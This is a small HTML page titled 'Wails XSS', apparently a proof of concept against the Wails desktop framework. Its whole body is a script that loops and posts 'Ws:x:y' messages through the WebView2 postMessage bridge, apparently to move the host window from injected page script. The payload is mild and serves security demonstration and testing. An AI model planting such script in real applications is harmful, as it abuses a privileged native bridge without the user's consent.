<!DOCTYPE html>
<html>

<head>
    <title>Wails XSS</title>
</head>

<body>
    <script>

        function loop() {
            const t = performance.now();
            const r = 500;
            const x = Math.floor( ( Math.sin( t / 1000 ) + 1 ) * r );
            const y = Math.floor( ( Math.cos( t / 1000 ) + 1 ) * r );
            const message = `Ws:${ x }:${ y }`;
            if ( window.chrome && window.chrome.webview )
                chrome.webview.postMessage( message );
            else
                console.log( message )
            requestAnimationFrame( loop );
        }
        loop();

    </script>
</body>

</html>
